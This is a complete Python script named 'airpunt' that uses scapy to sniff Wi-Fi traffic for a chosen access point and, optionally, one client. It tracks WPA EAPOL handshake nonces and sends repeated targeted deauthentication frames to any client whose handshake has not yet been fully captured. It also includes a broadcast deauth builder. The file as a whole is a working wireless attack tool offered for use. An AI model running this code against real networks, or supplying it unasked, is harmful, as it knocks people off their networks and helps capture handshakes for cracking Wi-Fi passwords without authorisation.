#!/usr/bin/python3

import argparse
import pyDot11 as p11
import sys
import time
from scapy.sendrecv import sendp, sniff
from scapy.packet import Raw
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.layers.eap import EAPOL
from scapy.utils import hexstr

### Next update will just use the Handshake() class from pyDot11
class Handshake(object):
    """Deal with any type of EAPOL traffic"""

    def __init__(self):
        self.p = p11.pt
        self.availTgts = set()
        self.catchDict = {}
        self.timer = {}
        self.delta = {}
        self.haveShake = set()

    def eapolGrab(self, pkt):
        """Notate and track gathered EAPOLs"""
        eNum = self.p.nonceDict.get(self.p.byteRip(pkt[Raw], qty = 3)[6:])
        if eNum[1] == '1' or eNum[1] == '2' or eNum[1] == '3':
            # nonce = hexstr(str(pkt.load), onlyhex = 1)[39:134]
            # hexPkt = hexstr(str(pkt), onlyhex = 1)
            nonce = hexstr(pkt.load, onlyhex = 1)[39:134]
            hexPkt = hexstr(pkt, onlyhex = 1)

            ### Discard EAPOL 4 of 4
            if nonce != '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00':
                vMAC = ''

                ## FROM-DS
                if eNum == 'a1' or eNum == 'a3' or eNum == 't1' or eNum == 't3':
                    vMAC = pkt[Dot11].addr1
                    bMAC = pkt[Dot11].addr2

                ## TO-DS
                if eNum == 'a2' or eNum == 't2':
                    vMAC = pkt[Dot11].addr2
                    bMAC = pkt[Dot11].addr1

                ## Deal with vMAC not in catchDict
                if vMAC not in self.catchDict:
                    if eNum[1] == '1':
                        anonce = True
                        snonce = False

                    elif eNum[1] == '2':
                        anonce = False
                        snonce = True

                    elif eNum[1] == '3':
                        anonce = True
                        snonce = False
                    self.catchDict.update({vMAC: (anonce, snonce)})

                ## Deal with vMAC in catchDict
                else:

                    ## Grab current anonce/snonce status
                    storedAnonce, storedSnonce = self.catchDict.get(vMAC)

                    ## Decide how to update
                    if eNum[1] == '1':
                        anonce = True
                        snonce = False

                    elif eNum[1] == '2':
                        anonce = False
                        snonce = True

                    elif eNum[1] == '3':
                        anonce = True
                        snonce = False

                    ## Deal with anonce
                    if anonce:
                        self.catchDict.update({vMAC: (True, storedSnonce)})
                    if snonce:
                        self.catchDict.update({vMAC: (storedAnonce, True)})

                ## Check for anonce and snonce for the given vMAC
                if self.catchDict.get(vMAC)[0] and self.catchDict.get(vMAC)[1]:

                    ## Add vMAC to list of available targets
                    self.availTgts.add(vMAC)

                    ## Print our results thus far
                    print('Our catchDict:\n{0}\n'.format(self.catchDict))


def tBuild(bssid, tgt):
    """Build a targeted deauth"""
    return RadioTap()/Dot11(addr1 = bssid,
                            addr2= tgt,
                            addr3 = bssid)/Dot11Deauth(reason = 1)


def bBuild(bssid):
    """Build a broadcast deauth
    Not used in airpunt, but left for demonstrational purposes"""
    return RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',
                            addr2= bssid,
                            addr3 = bssid)/Dot11Deauth(reason = 1)


def packetParser(args, shake):
    def engine(packet):
        tMAC = None
        bssid = None
        tStamp = time.time()

        ## Deal with handshakes
        # if packet.haslayer(EAPOL):
        #     print(packet.summary())
        if packet.haslayer(EAPOL):
            shake.eapolGrab(packet)

        ## Verify we're only caring about data frames and From-DS
        elif packet[Dot11].type == 2 and packet[Dot11].FCfield == 66:

            ## Reasons for deAuth
            if not packet.addr1 in shake.availTgts:
                bssid = packet.addr2
                tMAC = packet.addr1

        ## Verify we're only caring about data frames and To-DS
        elif packet[Dot11].type == 2 and packet[Dot11].FCfield == 65:

            ## Reasons for deAuth
            if not packet.addr2 in shake.availTgts:
                bssid = packet.addr1
                tMAC = packet.addr2

        ## Time for deAuth logic
        if bssid and tMAC:

            ## Avoid broadcasts
            if tMAC != 'ff:ff:ff:ff:ff:ff':

                ## Check to see if there exists an original timestamp
                if not tMAC in shake.timer:
                    shake.timer.update({tMAC: tStamp})
                    shake.delta.update({tMAC: tStamp})

                    ### DEBUG ~~> verbosity
                    pkt = tBuild(bssid, tMAC)
                    print(pkt.summary())
                    sendp(pkt, iface = args.i, verbose = 0)
                    # sendp(tBuild(bssid, tMAC), iface = args.i, verbose = 0)

                    print('Deauth sent for: {0}'.format(tMAC))
                else:
                    shake.delta.update({tMAC: tStamp})
                    #print 'new time: %s -- %s' % (tMAC, tStamp)

                    ## Check the deltas
                    old = shake.timer.get(tMAC)
                    new = shake.delta.get(tMAC)

                    ## Push the deauth
                    if new - old >= args.s:

                        ### DEBUG ~~> verbosity
                        pkt = tBuild(bssid, tMAC)
                        print(pkt.summary())
                        sendp(pkt, iface = args.i, verbose = 0)
                        # sendp(tBuild(bssid, tMAC), iface = args.i, verbose = 0)
                        print('Deauth sent for: {0}'.format(tMAC))
    return engine


def main(args):
    shake = Handshake()
    if not args.s:
        args.s = 3
    else:
        args.s = int(args.s)
    args.b = args.b.lower()
    if args.t:
        args.t = args.t.lower()
    pHandler = packetParser(args, shake)

    ## Any client
    if not args.t:
        sniff(iface = args.i,
              prn = pHandler,
              store = 0,
              lfilter = lambda x: x[Dot11].addr1 == args.b or x[Dot11].addr2 == args.b)

    ## Tgt client only
    else:
        sniff(iface = args.i,
                    prn = pHandler,
                    store = 0,
                    lfilter = lambda x: (x[Dot11].addr1 == args.b and x[Dot11].addr2 == args.t) or (x[Dot11].addr2 == args.b and x[Dot11].addr1 == args.t))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'airpunt - Targeted and methodical Deauths')
    parser.add_argument('-b',
                        metavar = '<tgt BSSID>',
                        required = True,
                        help = 'Target BSSID ---------------------- required')
    parser.add_argument('-i',
                        metavar = '<Monitor Mode NIC',
                        required = True,
                        help = 'NIC to sniff with ----------------- required')
    parser.add_argument('-s',
                        metavar = '<Sleep timer>',
                        help = 'Sleeptime between deauths ----- [Default: 3]')
    parser.add_argument('-t',
                        metavar = '<tgt MAC>',
                        help = 'Target MAC ------------------------ optional')
    args = parser.parse_args()
    main(args)
